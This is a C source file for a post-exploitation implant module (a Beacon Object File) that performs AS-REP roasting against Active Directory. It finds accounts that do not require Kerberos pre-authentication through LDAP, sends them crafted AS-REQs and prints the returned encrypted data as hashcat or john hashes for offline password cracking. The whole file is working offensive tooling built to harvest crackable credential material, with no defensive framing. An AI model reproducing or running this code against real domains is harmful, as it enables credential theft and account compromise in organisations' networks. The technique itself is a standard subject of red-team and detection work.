/*
 * asreproast.c — AS-REP Roasting BOF
 *
 * 1. Query LDAP for accounts with DONT_REQUIRE_PREAUTH (UAC & 0x400000)
 * 2. For each account, send AS-REQ without PA-ENC-TIMESTAMP to KDC port 88
 * 3. Parse AS-REP and extract encrypted timestamp (etype + cipher)
 * 4. Output in hashcat/john format for offline cracking
 *
 * Win32 APIs: wldap32.dll (LDAP), ws2_32.dll (raw Kerberos), netapi32.dll (DC discovery)
 */
#include <windows.h>
#include <winldap.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "beacon_compat.h"

/* ── Dynamic imports ── */
DECLSPEC_IMPORT LDAP* LDAPAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_next_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR* LDAPAPI WLDAP32$ldap_get_valuesW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_value_freeW(PWSTR*);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP*);

DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT void WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT INT WSAAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*);
DECLSPEC_IMPORT void WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$htonl(unsigned long);
DECLSPEC_IMPORT unsigned short WSAAPI WS2_32$htons(unsigned short);
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$ntohl(unsigned long);

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, void**);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

DECLSPEC_IMPORT int  WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int  WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameExW(int, LPWSTR, LPDWORD);

DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int      __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT size_t   __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT int      __cdecl MSVCRT$snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT void*    __cdecl MSVCRT$memcpy(void*, const void*, size_t);
DECLSPEC_IMPORT int      __cdecl MSVCRT$memset(void*, int, size_t);
DECLSPEC_IMPORT char*    __cdecl MSVCRT$strupr(char*);
DECLSPEC_IMPORT int      __cdecl MSVCRT$toupper(int);

/* ── ASN.1 DER encoding helpers ── */

/* Write tag + length, return bytes written */
static int der_write_tl(unsigned char *buf, unsigned char tag, int length) {
    int pos = 0;
    buf[pos++] = tag;
    if (length < 0x80) {
        buf[pos++] = (unsigned char)length;
    } else if (length < 0x100) {
        buf[pos++] = 0x81;
        buf[pos++] = (unsigned char)length;
    } else if (length < 0x10000) {
        buf[pos++] = 0x82;
        buf[pos++] = (unsigned char)(length >> 8);
        buf[pos++] = (unsigned char)(length & 0xFF);
    } else {
        buf[pos++] = 0x83;
        buf[pos++] = (unsigned char)(length >> 16);
        buf[pos++] = (unsigned char)((length >> 8) & 0xFF);
        buf[pos++] = (unsigned char)(length & 0xFF);
    }
    return pos;
}

/* Write INTEGER */
static int der_write_int(unsigned char *buf, int value) {
    int pos = 0;
    buf[pos++] = 0x02; /* INTEGER */
    if (value < 0x80) {
        buf[pos++] = 1;
        buf[pos++] = (unsigned char)value;
    } else if (value < 0x8000) {
        buf[pos++] = 2;
        buf[pos++] = (unsigned char)(value >> 8);
        buf[pos++] = (unsigned char)(value & 0xFF);
    } else {
        buf[pos++] = 4;
        buf[pos++] = (unsigned char)(value >> 24);
        buf[pos++] = (unsigned char)((value >> 16) & 0xFF);
        buf[pos++] = (unsigned char)((value >> 8) & 0xFF);
        buf[pos++] = (unsigned char)(value & 0xFF);
    }
    return pos;
}

/* Write GeneralString (tag 0x1B) */
static int der_write_genstring(unsigned char *buf, const char *str) {
    int len = (int)MSVCRT$strlen(str);
    int pos = der_write_tl(buf, 0x1B, len);
    MSVCRT$memcpy(buf + pos, str, len);
    return pos + len;
}

/* Write context-specific explicit tag [n] */
static int der_tl_size(int length) {
    if (length < 0x80) return 2;
    if (length < 0x100) return 3;
    if (length < 0x10000) return 4;
    return 5;
}

/*
 * Build a minimal AS-REQ for AS-REP roasting (no PA-ENC-TIMESTAMP).
 * RFC 4120 §5.4.1
 *
 * AS-REQ ::= [APPLICATION 10] KDC-REQ
 * KDC-REQ ::= SEQUENCE {
 *   pvno     [1] INTEGER = 5
 *   msg-type [2] INTEGER = 10  (AS-REQ)
 *   padata   [3] SEQUENCE OF PA-DATA  -- OMITTED for no pre-auth
 *   req-body [4] KDC-REQ-BODY
 * }
 * KDC-REQ-BODY ::= SEQUENCE {
 *   kdc-options [0] KerberosFlags (BITSTRING) = 0x40800010 (forwardable|renewable|canonicalize|renewable-ok)
 *   cname       [1] PrincipalName { name-type=1, name-string={username} }
 *   realm       [2] Realm (GeneralString)
 *   sname       [3] PrincipalName { name-type=2, name-string={"krbtgt", realm} }
 *   till        [5] KerberosTime = "20370913024805Z"
 *   nonce       [7] UInt32
 *   etype       [8] SEQUENCE OF Int32 = {23, 17, 18}  -- RC4, AES128, AES256
 * }
 */
static int build_as_req(unsigned char *out, int max_len,
                        const char *username, const char *realm) {
    unsigned char body[2048];
    int bpos = 0;

    /* We build inner-out: first the KDC-REQ-BODY, then wrap it */

    /* ── Build req-body content ── */
    unsigned char req_body[1500];
    int rpos = 0;

    /* [0] kdc-options: BIT STRING = 0x40800010 */
    {
        unsigned char opt[9];
        int opos = 0;
        unsigned char bitstr[5] = {0x00, 0x40, 0x80, 0x00, 0x10}; /* 0-padding + flags */
        opos = der_write_tl(opt, 0xA0, 7); /* [0] explicit */
        opt[opos++] = 0x03; opt[opos++] = 0x05; /* BIT STRING, len=5 */
        MSVCRT$memcpy(opt + opos, bitstr, 5); opos += 5;
        MSVCRT$memcpy(req_body + rpos, opt, opos); rpos += opos;
    }

    /* [1] cname: PrincipalName { name-type=1 (NT-PRINCIPAL), name-string={username} } */
    {
        unsigned char cname[512];
        int cpos = 0;

        /* name-string SEQUENCE OF GeneralString */
        unsigned char ns[256];
        int nspos = 0;
        nspos = der_write_genstring(ns, username);
        /* Wrap in SEQUENCE */
        unsigned char ns_seq[260];
        int nsq = der_write_tl(ns_seq, 0x30, nspos);
        MSVCRT$memcpy(ns_seq + nsq, ns, nspos); nsq += nspos;

        /* name-type [0] INTEGER = 1 */
        unsigned char nt[8];
        int ntpos = der_write_tl(nt, 0xA0, 3);
        ntpos += der_write_int(nt + ntpos, 1);

        /* [1] name-string */
        unsigned char ns_tagged[270];
        int nst = der_write_tl(ns_tagged, 0xA1, nsq);
        MSVCRT$memcpy(ns_tagged + nst, ns_seq, nsq); nst += nsq;

        /* PrincipalName SEQUENCE */
        int pn_inner = ntpos + nst;
        cpos = der_write_tl(cname, 0x30, pn_inner);
        MSVCRT$memcpy(cname + cpos, nt, ntpos); cpos += ntpos;
        MSVCRT$memcpy(cname + cpos, ns_tagged, nst); cpos += nst;

        /* [1] explicit tag */
        int tagged_len = der_write_tl(req_body + rpos, 0xA1, cpos);
        MSVCRT$memcpy(req_body + rpos + tagged_len, cname, cpos);
        rpos += tagged_len + cpos;
    }

    /* [2] realm: GeneralString */
    {
        /* Convert realm to uppercase */
        char upper_realm[256];
        int ri;
        for (ri = 0; realm[ri] && ri < 255; ri++)
            upper_realm[ri] = (char)MSVCRT$toupper((unsigned char)realm[ri]);
        upper_realm[ri] = '\0';

        unsigned char r[260];
        int rl = der_write_genstring(r, upper_realm);
        int tagged_len = der_write_tl(req_body + rpos, 0xA2, rl);
        MSVCRT$memcpy(req_body + rpos + tagged_len, r, rl);
        rpos += tagged_len + rl;
    }

    /* [3] sname: PrincipalName { name-type=2 (NT-SRV-INST), name-string={"krbtgt", REALM} } */
    {
        char upper_realm[256];
        int ri;
        for (ri = 0; realm[ri] && ri < 255; ri++)
            upper_realm[ri] = (char)MSVCRT$toupper((unsigned char)realm[ri]);
        upper_realm[ri] = '\0';

        unsigned char sname[512];
        int spos = 0;

        /* name-string: SEQUENCE OF { "krbtgt", REALM } */
        unsigned char ns[300];
        int nspos = 0;
        nspos += der_write_genstring(ns + nspos, "krbtgt");
        nspos += der_write_genstring(ns + nspos, upper_realm);
        unsigned char ns_seq[310];
        int nsq = der_write_tl(ns_seq, 0x30, nspos);
        MSVCRT$memcpy(ns_seq + nsq, ns, nspos); nsq += nspos;

        /* name-type [0] INTEGER = 2 */
        unsigned char nt[8];
        int ntpos = der_write_tl(nt, 0xA0, 3);
        ntpos += der_write_int(nt + ntpos, 2);

        /* [1] name-string */
        unsigned char ns_tagged[320];
        int nst = der_write_tl(ns_tagged, 0xA1, nsq);
        MSVCRT$memcpy(ns_tagged + nst, ns_seq, nsq); nst += nsq;

        /* PrincipalName SEQUENCE */
        int pn_inner = ntpos + nst;
        spos = der_write_tl(sname, 0x30, pn_inner);
        MSVCRT$memcpy(sname + spos, nt, ntpos); spos += ntpos;
        MSVCRT$memcpy(sname + spos, ns_tagged, nst); spos += nst;

        /* [3] explicit tag */
        int tagged_len = der_write_tl(req_body + rpos, 0xA3, spos);
        MSVCRT$memcpy(req_body + rpos + tagged_len, sname, spos);
        rpos += tagged_len + spos;
    }

    /* [5] till: GeneralizedTime "20370913024805Z" */
    {
        const char *till = "20370913024805Z";
        int tl = (int)MSVCRT$strlen(till);
        unsigned char t[20];
        int tp = der_write_tl(t, 0x18, tl); /* GeneralizedTime */
        MSVCRT$memcpy(t + tp, till, tl); tp += tl;
        int tagged_len = der_write_tl(req_body + rpos, 0xA5, tp);
        MSVCRT$memcpy(req_body + rpos + tagged_len, t, tp);
        rpos += tagged_len + tp;
    }

    /* [7] nonce: UInt32 (use a simple value) */
    {
        unsigned char n[8];
        int np = der_write_int(n, 12345678);
        int tagged_len = der_write_tl(req_body + rpos, 0xA7, np);
        MSVCRT$memcpy(req_body + rpos + tagged_len, n, np);
        rpos += tagged_len + np;
    }

    /* [8] etype: SEQUENCE OF Int32 = {23, 17, 18} */
    {
        unsigned char etypes[20];
        int ep = 0;
        ep += der_write_int(etypes + ep, 23); /* RC4-HMAC */
        ep += der_write_int(etypes + ep, 17); /* AES128 */
        ep += der_write_int(etypes + ep, 18); /* AES256 */
        unsigned char seq[30];
        int sq = der_write_tl(seq, 0x30, ep);
        MSVCRT$memcpy(seq + sq, etypes, ep); sq += ep;
        int tagged_len = der_write_tl(req_body + rpos, 0xA8, sq);
        MSVCRT$memcpy(req_body + rpos + tagged_len, seq, sq);
        rpos += tagged_len + sq;
    }

    /* Wrap req_body in SEQUENCE */
    unsigned char req_body_seq[1600];
    int rbsq = der_write_tl(req_body_seq, 0x30, rpos);
    MSVCRT$memcpy(req_body_seq + rbsq, req_body, rpos); rbsq += rpos;

    /* ── Build KDC-REQ ── */
    /* pvno [1] INTEGER = 5 */
    unsigned char pvno[8];
    int pvno_inner = der_write_int(pvno + 2, 5);
    pvno[0] = 0xA1;
    pvno[1] = (unsigned char)pvno_inner;
    int pvno_len = 2 + pvno_inner;

    /* msg-type [2] INTEGER = 10 */
    unsigned char msgtype[8];
    int mt_inner = der_write_int(msgtype + 2, 10);
    msgtype[0] = 0xA2;
    msgtype[1] = (unsigned char)mt_inner;
    int mt_len = 2 + mt_inner;

    /* req-body [4] */
    unsigned char rb_tagged[1700];
    int rbt = der_write_tl(rb_tagged, 0xA4, rbsq);
    MSVCRT$memcpy(rb_tagged + rbt, req_body_seq, rbsq); rbt += rbsq;

    /* KDC-REQ SEQUENCE */
    int seq_inner = pvno_len + mt_len + rbt;
    bpos = der_write_tl(body, 0x30, seq_inner);
    MSVCRT$memcpy(body + bpos, pvno, pvno_len); bpos += pvno_len;
    MSVCRT$memcpy(body + bpos, msgtype, mt_len); bpos += mt_len;
    MSVCRT$memcpy(body + bpos, rb_tagged, rbt); bpos += rbt;

    /* Wrap in [APPLICATION 10] for AS-REQ */
    if (bpos + 10 > max_len) return 0;
    int total = der_write_tl(out, 0x6A, bpos);
    MSVCRT$memcpy(out + total, body, bpos);
    total += bpos;

    return total;
}

/*
 * Parse AS-REP to extract the encrypted part for offline cracking.
 * AS-REP ::= [APPLICATION 11] KDC-REP
 *
 * We need to extract:
 *   - etype from enc-part
 *   - cipher from enc-part
 * and format as hashcat mode 18200 ($krb5asrep$23$...)
 */
static int parse_asn1_len(const unsigned char *data, int *offset) {
    unsigned char b = data[*offset]; (*offset)++;
    if (b < 0x80) return b;
    int num_bytes = b & 0x7F;
    int length = 0;
    for (int i = 0; i < num_bytes && i < 4; i++) {
        length = (length << 8) | data[*offset]; (*offset)++;
    }
    return length;
}

static void parse_as_rep(const unsigned char *data, int total_len,
                         const char *username, const char *realm, int hashcat_fmt) {
    if (total_len < 10) return;

    /* Verify AS-REP: [APPLICATION 11] = 0x6B */
    if (data[0] != 0x6B) {
        /* Check for KRB-ERROR: [APPLICATION 30] = 0x7E */
        if (data[0] == 0x7E) {
            BeaconPrintf(CALLBACK_ERROR, "[!] KDC returned KRB-ERROR for %s (pre-auth may be required)\n", username);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Unexpected response tag 0x%02X for %s\n", data[0], username);
        }
        return;
    }

    /*
     * We need to find the enc-part at the end of the AS-REP.
     * The enc-part is [6] EncryptedData.
     * EncryptedData ::= SEQUENCE {
     *   etype  [0] Int32,
     *   kvno   [1] UInt32 OPTIONAL,
     *   cipher [2] OCTET STRING
     * }
     *
     * Strategy: scan for context tag [6] (0xA6) which contains the enc-part.
     * Then parse the EncryptedData SEQUENCE inside.
     */
    int etype = 0;
    const unsigned char *cipher = NULL;
    int cipher_len = 0;

    /* Walk through the AS-REP looking for tag 0xA6 (enc-part [6]) */
    int pos = 0;
    /* Skip [APPLICATION 11] tag + length */
    pos++; /* 0x6B */
    parse_asn1_len(data, &pos);
    /* Now inside the SEQUENCE */
    pos++; /* 0x30 */
    parse_asn1_len(data, &pos);

    /* Walk the SEQUENCE contents looking for [6] */
    while (pos < total_len - 2) {
        unsigned char tag = data[pos];
        if (tag == 0xA6) {
            /* Found enc-part */
            pos++;
            int enc_part_len = parse_asn1_len(data, &pos);
            int enc_part_end = pos + enc_part_len;

            /* Inside: SEQUENCE { [0] etype, [1] kvno, [2] cipher } */
            if (data[pos] != 0x30) break;
            pos++;
            parse_asn1_len(data, &pos);

            while (pos < enc_part_end - 2) {
                unsigned char inner_tag = data[pos];
                pos++;
                int inner_len = parse_asn1_len(data, &pos);

                if (inner_tag == 0xA0) {
                    /* [0] etype — INTEGER */
                    if (data[pos] == 0x02) {
                        pos++;
                        int int_len = parse_asn1_len(data, &pos);
                        etype = 0;
                        for (int i = 0; i < int_len; i++)
                            etype = (etype << 8) | data[pos + i];
                        pos += int_len;
                    } else {
                        pos += inner_len;
                    }
                } else if (inner_tag == 0xA2) {
                    /* [2] cipher — OCTET STRING */
                    if (data[pos] == 0x04) {
                        pos++;
                        cipher_len = parse_asn1_len(data, &pos);
                        cipher = data + pos;
                        pos += cipher_len;
                    } else {
                        pos += inner_len;
                    }
                } else {
                    pos += inner_len;
                }
            }
            break;
        } else {
            /* Skip this tagged field */
            pos++;
            int skip_len = parse_asn1_len(data, &pos);
            pos += skip_len;
        }
    }

    if (!cipher || cipher_len < 16) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract cipher from AS-REP for %s\n", username);
        return;
    }

    /* Convert realm to uppercase */
    char upper_realm[256];
    int ri;
    for (ri = 0; realm[ri] && ri < 255; ri++)
        upper_realm[ri] = (char)MSVCRT$toupper((unsigned char)realm[ri]);
    upper_realm[ri] = '\0';

    /* Format hash */
    /* For etype 23 (RC4): hashcat mode 18200
     * Format: $krb5asrep$23$user@REALM:<checksum_16bytes>$<cipher_rest>
     * The first 16 bytes of cipher are the checksum, rest is the encrypted data.
     */
    if (etype == 23) {
        /* checksum = first 16 bytes, encrypted = rest */
        char checksum_hex[33] = {0};
        for (int i = 0; i < 16 && i < cipher_len; i++)
            MSVCRT$snprintf(checksum_hex + i * 2, 3, "%02x", cipher[i]);

        /* Build cipher hex */
        int enc_len = cipher_len - 16;
        char *cipher_hex = (char *)malloc(enc_len * 2 + 1);
        if (!cipher_hex) return;
        for (int i = 0; i < enc_len; i++)
            MSVCRT$snprintf(cipher_hex + i * 2, 3, "%02x", cipher[16 + i]);

        BeaconPrintf(CALLBACK_OUTPUT, "$krb5asrep$%d$%s@%s:%s$%s\n",
                     etype, username, upper_realm, checksum_hex, cipher_hex);
        free(cipher_hex);
    } else {
        /* AES etypes (17/18): hashcat mode 19600/19700
         * Format: $krb5asrep$%d$user@REALM:<full_cipher_hex>
         */
        char *full_hex = (char *)malloc(cipher_len * 2 + 1);
        if (!full_hex) return;
        for (int i = 0; i < cipher_len; i++)
            MSVCRT$snprintf(full_hex + i * 2, 3, "%02x", cipher[i]);

        BeaconPrintf(CALLBACK_OUTPUT, "$krb5asrep$%d$%s@%s:%s\n",
                     etype, username, upper_realm, full_hex);
        free(full_hex);
    }
}

/*
 * Send AS-REQ to KDC over TCP and receive AS-REP.
 * Kerberos over TCP: 4-byte big-endian length prefix + message.
 */
static int send_recv_kdc(const char *dc_addr, const unsigned char *req, int req_len,
                         unsigned char *resp, int resp_max) {
    PADDRINFOA result = NULL;
    ADDRINFOA hints;
    MSVCRT$memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (WS2_32$getaddrinfo(dc_addr, "88", &hints, &result) != 0 || !result) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Cannot resolve KDC: %s\n", dc_addr);
        return -1;
    }

    SOCKET s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        WS2_32$freeaddrinfo(result);
        return -1;
    }

    if (WS2_32$connect(s, result->ai_addr, (int)result->ai_addrlen) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Cannot connect to KDC %s:88\n", dc_addr);
        WS2_32$closesocket(s);
        WS2_32$freeaddrinfo(result);
        return -1;
    }
    WS2_32$freeaddrinfo(result);

    /* Send: 4-byte length prefix (big-endian) + AS-REQ */
    unsigned long net_len = WS2_32$htonl((unsigned long)req_len);
    WS2_32$send(s, (const char *)&net_len, 4, 0);
    WS2_32$send(s, (const char *)req, req_len, 0);

    /* Receive: 4-byte length prefix + response */
    unsigned long resp_len_net;
    int rcvd = WS2_32$recv(s, (char *)&resp_len_net, 4, 0);
    if (rcvd != 4) {
        WS2_32$closesocket(s);
        return -1;
    }
    int resp_len = (int)WS2_32$ntohl(resp_len_net);
    if (resp_len > resp_max || resp_len <= 0) {
        WS2_32$closesocket(s);
        return -1;
    }

    /* Read full response */
    int total_rcvd = 0;
    while (total_rcvd < resp_len) {
        rcvd = WS2_32$recv(s, (char *)(resp + total_rcvd), resp_len - total_rcvd, 0);
        if (rcvd <= 0) break;
        total_rcvd += rcvd;
    }

    WS2_32$closesocket(s);
    return total_rcvd;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *domain = BeaconDataExtract(&parser, NULL);
    char *user = BeaconDataExtract(&parser, NULL);
    char *dc = BeaconDataExtract(&parser, NULL);
    int format = BeaconDataInt(&parser);

    /* Auto-detect domain if not specified */
    wchar_t wDomain[256] = {0};
    if (domain && *domain) {
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
    } else {
        DWORD size = 256;
        KERNEL32$GetComputerNameExW(ComputerNameDnsDomain, wDomain, &size);
    }

    char aDomain[256] = {0};
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, aDomain, 256, NULL, NULL);

    /* Auto-discover DC */
    char aDC[256] = {0};
    if (dc && *dc) {
        int i; for (i = 0; dc[i] && i < 255; i++) aDC[i] = dc[i]; aDC[i] = '\0';
    } else {
        void *dcInfo = NULL;
        if (NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo) == 0 && dcInfo) {
            LPWSTR dcName = *(LPWSTR*)dcInfo;
            if (dcName) {
                if (dcName[0] == L'\\' && dcName[1] == L'\\') dcName += 2;
                KERNEL32$WideCharToMultiByte(CP_UTF8, 0, dcName, -1, aDC, 255, NULL, NULL);
            }
            NETAPI32$NetApiBufferFree(dcInfo);
        }
        if (!aDC[0]) {
            BeaconPrintf(CALLBACK_ERROR, "[!] DC auto-discovery failed. Use --dc.\n");
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] AS-REP Roasting against %s (KDC: %s)\n", aDomain, aDC);

    /* Initialize Winsock */
    WSADATA wsa;
    WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa);

    /* If specific user given, skip LDAP and just roast that user */
    if (user && *user) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting specific user: %s\n", user);

        unsigned char as_req[4096];
        int req_len = build_as_req(as_req, sizeof(as_req), user, aDomain);
        if (req_len > 0) {
            unsigned char as_rep[65536];
            int rep_len = send_recv_kdc(aDC, as_req, req_len, as_rep, sizeof(as_rep));
            if (rep_len > 0) {
                parse_as_rep(as_rep, rep_len, user, aDomain, format);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[!] No response from KDC for %s\n", user);
            }
        }
        WS2_32$WSACleanup();
        return;
    }

    /* Query LDAP for DONT_REQUIRE_PREAUTH accounts */
    LDAP *ld = WLDAP32$ldap_initW(wDomain, 389);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_init failed\n");
        WS2_32$WSACleanup();
        return;
    }

    if (WLDAP32$ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_bind failed\n");
        WS2_32$WSACleanup();
        return;
    }

    wchar_t *filter =
        L"(&(objectCategory=person)(objectClass=user)"
        L"(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
        L"(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";

    wchar_t *attrs[] = { L"sAMAccountName", NULL };
    LDAPMessage *results = NULL;

    /* Build base DN from domain */
    wchar_t baseDN[512] = {0};
    {
        wchar_t *p = wDomain, *out = baseDN;
        BOOL first = TRUE;
        while (*p) {
            if (!first) { *out++ = L','; }
            MSVCRT$wcscpy(out, L"DC="); out += 3;
            while (*p && *p != L'.') { *out++ = *p++; }
            if (*p == L'.') p++;
            first = FALSE;
        }
    }

    if (WLDAP32$ldap_search_sW(ld, baseDN, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &results) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LDAP search failed\n");
        WLDAP32$ldap_unbind(ld);
        WS2_32$WSACleanup();
        return;
    }

    /* For each account, send AS-REQ to KDC */
    int count = 0;
    LDAPMessage *entry = WLDAP32$ldap_first_entry(ld, results);
    while (entry) {
        wchar_t **samValues = WLDAP32$ldap_get_valuesW(ld, entry, L"sAMAccountName");
        if (samValues && samValues[0]) {
            char aUser[256];
            KERNEL32$WideCharToMultiByte(CP_UTF8, 0, samValues[0], -1, aUser, 256, NULL, NULL);

            BeaconPrintf(CALLBACK_OUTPUT, "[*] Found: %s (DONT_REQUIRE_PREAUTH)\n", aUser);

            unsigned char as_req[4096];
            int req_len = build_as_req(as_req, sizeof(as_req), aUser, aDomain);

            if (req_len > 0) {
                unsigned char as_rep[65536];
                int rep_len = send_recv_kdc(aDC, as_req, req_len, as_rep, sizeof(as_rep));
                if (rep_len > 0) {
                    parse_as_rep(as_rep, rep_len, aUser, aDomain, format);
                    count++;
                } else {
                    BeaconPrintf(CALLBACK_ERROR, "[!] No response from KDC for %s\n", aUser);
                }
            }

            WLDAP32$ldap_value_freeW(samValues);
        }
        entry = WLDAP32$ldap_next_entry(ld, entry);
    }

    WLDAP32$ldap_msgfree(results);
    WLDAP32$ldap_unbind(ld);
    WS2_32$WSACleanup();

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] AS-REP Roasted %d account(s)\n", count);
}
